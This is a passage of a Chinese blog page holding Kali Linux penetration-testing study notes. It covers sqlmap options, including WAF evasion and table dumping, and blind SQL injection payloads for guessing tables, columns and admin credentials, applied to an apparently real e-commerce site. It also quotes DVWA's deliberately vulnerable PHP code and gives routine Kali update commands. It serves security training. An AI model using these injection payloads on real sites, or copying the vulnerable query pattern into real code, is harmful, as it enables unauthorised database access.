<h4 id="36-SQLMAP–MISCELLANEOUS-→-助记符（-z）"><a href="#36-SQLMAP–MISCELLANEOUS-→-助记符（-z）" class="headerlink" title="36. SQLMAP–MISCELLANEOUS → 助记符（-z）"></a>36. SQLMAP–MISCELLANEOUS → 助记符（-z）</h4><ul>
<li>-z（参数助记符）</li>
<li>原：sqlmap –batch –random-agent –ignore-proxy –technique=BEU -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a></li>
<li>后：sqlmap -z “bat,randoma,ign,tec=BEU” -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a></li>
<li>原：sqlmap –ignore-proxy –flush-session –technique=U –dump -D testdb -T users -u “1.1.1.1/a.php?id=1” </li>
<li>后：sqlmap -z “ign,flu,bat,tec=U,dump,D=testdb,T=users” -u “1.1.1.1/ vuln.php?id=1”</li>
</ul>
<h4 id="37-SQLMAP–MISCELLANEOUS-→-answer-check-waf-hpp-identify-waf（▲-2020-1-15命令执行无返回数据）"><a href="#37-SQLMAP–MISCELLANEOUS-→-answer-check-waf-hpp-identify-waf（▲-2020-1-15命令执行无返回数据）" class="headerlink" title="37. SQLMAP–MISCELLANEOUS → answer/check-waf/hpp/identify-waf（▲ 2020.1.15命令执行无返回数据）"></a>37. SQLMAP–MISCELLANEOUS → answer/check-waf/hpp/identify-waf（▲ 2020.1.15命令执行无返回数据）</h4><ul>
<li>–answer<ul>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a> –technique=E –answers=”extending=N” –batch</li>
</ul>
</li>
<li>–check-waf（检测WAF/IPS/IDS）（▲ 2020.1.15此参数更新后暂无）</li>
<li>–hpp（HTTP parameter pollution，Web Application的一个漏洞）<ul>
<li>绕过WAF/IPS/IDS的有效方法</li>
<li>尤其对ASP/IIS和ASP.NET/IIS</li>
</ul>
</li>
<li>–identify-waf（彻底的waf/ips/ids检查）<ul>
<li>检查30多种产品</li>
</ul>
</li>
</ul>
<h4 id="38-SQLMAP–MISCELLANEOUS-→-Misc"><a href="#38-SQLMAP–MISCELLANEOUS-→-Misc" class="headerlink" title="38. SQLMAP–MISCELLANEOUS → Misc"></a>38. SQLMAP–MISCELLANEOUS → Misc</h4><ul>
<li>–mobile（模拟智能手机设备）</li>
<li>–purge-output（清除output文件夹）（▲ 2020.1.15修改参数为–purge）</li>
<li>–smart（当有大量检测目标时，只选择基于错误的检测结果）</li>
<li>–wizard（sqlmap向导）</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E7%9B%B2%E6%B3%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E7%9B%B2%E6%B3%A8/" itemprop="url">Kali Linux笔记(五十)：手动漏洞挖掘--SQL盲注</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-14T20:12:46+08:00">
                2020-01-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-判断技术"><a href="#1-判断技术" class="headerlink" title="1. 判断技术"></a>1. 判断技术</h4><ul>
<li>不显示数据库内建的报错信息<ul>
<li>内建的报错信息帮助开发人员发现和修复问题</li>
<li>报错信息提供关于系统的大量有用信息</li>
</ul>
</li>
<li>当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，sql注入将无法依据报错信息判断注入语句的执行结果，即为盲注</li>
<li>思路：既然无法基于报错信息判断结果，基于逻辑真假的不同结果来判断<ul>
<li>1’ and 1=1–+</li>
<li>1’ and 1=2–+</li>
<li>1’ order by 5–+  假</li>
<li>1’ order by 2–+  真</li>
<li>1’ union select 1,2–+</li>
<li>1’ union select null,CONCAT_WS(CHAR(32,58,32),user(),database(),version())–+</li>
<li>1’ and 1=0 union select null,table_name from information_schema.tables#</li>
<li>1’ and 1=0 union selcet null,table_name from information_schema.colums where table_name=’users’#</li>
</ul>
</li>
</ul>
<h4 id="2-猜字段–无information-scheme"><a href="#2-猜字段–无information-scheme" class="headerlink" title="2. 猜字段–无information_scheme"></a>2. 猜字段–无information_scheme</h4><ul>
<li>无权读取information_shcema库/拒绝union、order by语句<ul>
<li>猜列名：1’ and user is not null–+</li>
<li>猜当前表名：1’ and table.user is not null–+</li>
<li>猜库里其他表：1’ and (select count() from table)&gt;0–+</li>
<li>列表对应关系：1’ and users.user is not null–+</li>
<li>猜字段内容：1’ and user=’admin’/1’ or user like ‘%a’</li>
<li>猜账号对应密码：2’ or user=’admin’ and password=’5f4dcc3b5aa765d61d8327deb832cf99</li>
<li>▲ Burpsuite自动化猜解内容</li>
</ul>
</li>
</ul>
<h4 id="3-真实实例"><a href="#3-真实实例" class="headerlink" title="3. 真实实例"></a>3. 真实实例</h4><ul>
<li>开个脑洞<ul>
<li>真实案例：某电商网站</li>
<li><a href="http://1.1.1.1/goods.php?cnt=1&amp;goodsid=123" target="_blank" rel="noopener">http://1.1.1.1/goods.php?cnt=1&amp;goodsid=123</a></li>
<li>and 1=1–+  显示一包面巾纸</li>
<li>and 1-2–+  显示一袋洗衣粉</li>
<li>1’ and ORD(MID((VERSION()),1,1))&amp;（1/2/4/8/16/32/64/128）&gt;0–+</li>
<li>CURRENT_USER()、DATABASE()</li>
<li>MID用法：MID(ColumnName,Start [,Length])</li>
<li>ORD用法：ORD(string)   #ASCII码</li>
</ul>
</li>
</ul>
<h4 id="4-DVWA的SQL盲注源码"><a href="#4-DVWA的SQL盲注源码" class="headerlink" title="4. DVWA的SQL盲注源码"></a>4. DVWA的SQL盲注源码</h4><ul>
<li>DVWA的SQL Injection(Blind) Source（Low）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line">    </span><br><span class="line">    // Retrieve data</span><br><span class="line">    </span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">    $result = mysql_query($getid); // Removed &apos;or die&apos; to suppres mysql errors</span><br><span class="line"></span><br><span class="line">    $num = @mysql_numrows($result); // The &apos;@&apos; character suppresses errors making the injection &apos;blind&apos;</span><br><span class="line"></span><br><span class="line">    $i = 0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>DVWA的SQL Injection(Blind) Source（Medium）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id&quot;;</span><br><span class="line">    $result = mysql_query($getid); // Removed &apos;or die&apos; to suppres mysql errors</span><br><span class="line">    </span><br><span class="line">    $num = @mysql_numrows($result); // The &apos;@&apos; character suppresses errors making the injection &apos;blind&apos;</span><br><span class="line"></span><br><span class="line">    $i=0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first=mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last=mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>DVWA的SQL Injection(Blind) Source（High）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;Submit&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = stripslashes($id);</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    if (is_numeric($id)) &#123;</span><br><span class="line"></span><br><span class="line">        $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">        $result = mysql_query($getid); // Removed &apos;or die&apos; to suppres mysql errors</span><br><span class="line"></span><br><span class="line">        $num = @mysql_numrows($result); // The &apos;@&apos; character suppresses errors making the injection &apos;blind&apos;</span><br><span class="line"></span><br><span class="line">        $i=0;</span><br><span class="line"></span><br><span class="line">        while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">            $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">            $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">            </span><br><span class="line">            echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">            echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">            echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AB)%EF%BC%9AKali%20Linux%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0--rolling/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AB)%EF%BC%9AKali%20Linux%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0--rolling/" itemprop="url">Kali Linux笔记(四十八)：Kali Linux版本更新--rolling</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-14T20:11:35+08:00">
                2020-01-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Kali-Linux版本更新–第一个Rolling-RELEASE"><a href="#1-Kali-Linux版本更新–第一个Rolling-RELEASE" class="headerlink" title="1. Kali Linux版本更新–第一个Rolling RELEASE"></a>1. Kali Linux版本更新–第一个Rolling RELEASE</h4><ul>
<li>Kali 2.0发布时声称将采用rolling release模式更新（但并未实施）</li>
<li>Fixed-release<ul>
<li>固定发布周期</li>
<li>使用软件稳定的主流版本（发布–主流–作废）</li>
<li>更稳定，适合于企业生成环境</li>
</ul>
</li>
<li>Rolling release<ul>
<li>适用于开发者和技术人员</li>
<li>连续升级新版本，追求在新功能出现后最快使用</li>
<li>正式成为流行</li>
</ul>
</li>
<li>Kali 2.0 rolling release<ul>
<li>采用debian testing库作为更新源</li>
</ul>
</li>
<li>软件包追踪<ul>
<li><a href="https://pkg.kali.org/" target="_blank" rel="noopener">https://pkg.kali.org/</a></li>
</ul>
</li>
<li>VMware Tools vs Open-VM-Tools<ul>
<li><strong><code>🔺命令：apt-get install open-vm-tools-desktop fuse</code></strong></li>
</ul>
</li>
<li>Gnome 3.18</li>
<li>4.3内核</li>
<li>Kali 2.0现有版本升级</li>
</ul>
<blockquote>
<pre><code>⭐现有版本更新
cat &lt;&lt; EOF &gt; /etc/apt/sources.list
deb http://http.kali.org/kali kali-rolling main non-free contrib
EOF

⭐安装命令
apt-get update
apt-get dist-upgrade 
reboot

⭐查看版本号，代码号
lsb_release -a</code></pre></blockquote>
<ul>
<li>Kali sana库于2016年4月15日停止更新</li>
<li>工具有所更新</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/">Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/3/">Next</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/photo.jpg"
                alt="Tomas" />
            
              <p class="site-author-name" itemprop="name">Tomas</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">75</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Tomassky" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:643008933@qq.com" target="_blank" title="QQ邮箱">
                      
                        <i class="fa fa-fw fa-envelope"></i>QQ邮箱</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ylsword-cheat.top" title="LengSword" target="_blank">LengSword</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://neigeshoufu.github.io/ljy.github.io" title="neigeshoufu" target="_blank">neigeshoufu</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Tomas</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
